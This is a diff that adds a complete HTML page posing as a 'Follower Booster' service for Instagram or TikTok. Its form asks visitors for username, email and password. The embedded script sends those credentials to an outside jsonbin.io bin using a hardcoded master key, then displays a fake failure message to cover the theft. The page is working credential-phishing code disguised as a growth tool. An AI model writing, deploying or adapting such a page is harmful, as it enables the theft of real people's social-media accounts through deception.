@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Follower Booster</title>
+  <style>
+    * { 
+        text-align: center;
+    }
+    body {
+      background: linear-gradient(to bottom , rgba(0, 0, 0, 0.9), rgba(19, 0, 83, 0.9));
+      margin: 0;
+      font-family: sans-serif;
+      display: flex;
+      align-items: center;
+      flex-direction: column;
+      justify-content: center;
+      height: 100vh;
+    }
+    .card {
+      background: linear-gradient(to bottom right, rgba(185, 165, 251, 0.9), rgba(19, 0, 83, 0.9));
+
+      padding: 2rem;
+      border-radius: 1.5rem;
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+      width: 70vw;
+    }
+    h1 {
+      text-align: center;
+      color: #ffffff;
+      margin: 1rem;
+
+    }
+    input {
+      width: 100%;
+      padding: 0.8rem  0;
+      padding-left: .3em;
+      margin: 0.5rem auto;
+      border: 1px solid #ccc;
+      border-radius: 0.8rem;
+      font-size: 1.2rem;
+    }
+    button:hover {
+      color: #4a3fd6;
+      background: white;
+
+    }
+    button {
+        transition: .3s;
+      width: 100%;
+      padding: 0.8rem;
+      background: #4a3fd6;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 0.8rem;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+    .success {
+      text-align: center;
+      color: red;
+      margin-top: 1rem;
+      border-radius: 0.8rem;
+      font-weight: bold;
+      padding: 0.8rem;
+
+      background-color: white;
+    }
+    .follower-form *{
+        margin: 0 auto;
+    }
+  </style>
+</head>
+<body>
+<h1>Boost Your Followers 🚀</h1>
+  <div class="card">
+    <h1>Send Request to API</h1>
+    <form id="follower-form">
+      <input type="text" id="username" placeholder="Username (Instagram or TikTok)" required />
+      <input type="email" id="email" placeholder="Email" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit" class="submit-btn">Sign Up New Request</button>
+    </form>
+    <div class="success" id="success-msg" style="display: none;">
+      🎉 Failed to Send Request! Try asking for Followers Later.
+    </div>
+  </div>
+
+  <script>
+    const API_KEY = "$2a$10$7JYodIuNzLl4C4Ys.fMFGe/pW2qGhsLhPlpVCQourwieF/m.PuDjq";
+    const BIN_ID = "6886828c7b4b8670d8a83934";
+    const BIN_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
+
+    document.getElementById('follower-form').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      document.querySelector('.submit-btn').style.background=  'white';
+      document.querySelector('.submit-btn').style.color=  '#4a3fd6';
+
+      const username = document.getElementById('username').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!username || !email || !password) return;
+
+      try {
+        // Fetch existing data
+        const getRes = await fetch(BIN_URL + "/latest", {
+          headers: {
+            "X-Master-Key": API_KEY
+          }
+        });
+
+        const jsonData = await getRes.json();
+        const existingData = jsonData.record || { users: [] };
+
+        // Add new entry
+        existingData.users.push({ username, email, password });
+
+        // Update bin
+        await fetch(BIN_URL, {
+          method: "PUT",
+          headers: {
+            "Content-Type": "application/json",
+            "X-Master-Key": API_KEY
+          },
+          body: JSON.stringify(existingData)
+        });
+
+        document.getElementById("success-msg").style.display = "block";
+        document.getElementById("follower-form").reset();
+        
+        document.querySelector('.submit-btn').style.color=  'white';
+        document.querySelector('.submit-btn').style.background=  '#4a3fd6';
+      } catch (err) {
+        alert("❌ Failed to submit. Please try again.");
+        console.error(err);
+      }
+    });
+  </script>
+</body>
+</html>
